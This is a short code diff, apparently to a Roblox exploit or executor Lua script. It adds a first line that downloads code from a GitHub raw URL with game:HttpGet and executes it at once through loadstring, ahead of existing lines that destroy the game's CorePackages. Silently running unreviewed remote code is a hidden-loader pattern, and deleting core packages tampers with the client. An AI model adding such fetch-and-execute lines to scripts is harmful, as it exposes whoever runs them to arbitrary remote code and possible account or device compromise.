@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WhatsHisIdentifier/NoKey/refs/heads/main/Discord",true))()
 repeat wait() until game:IsLoaded()
 
 game:GetService("CorePackages").Packages:Destroy()
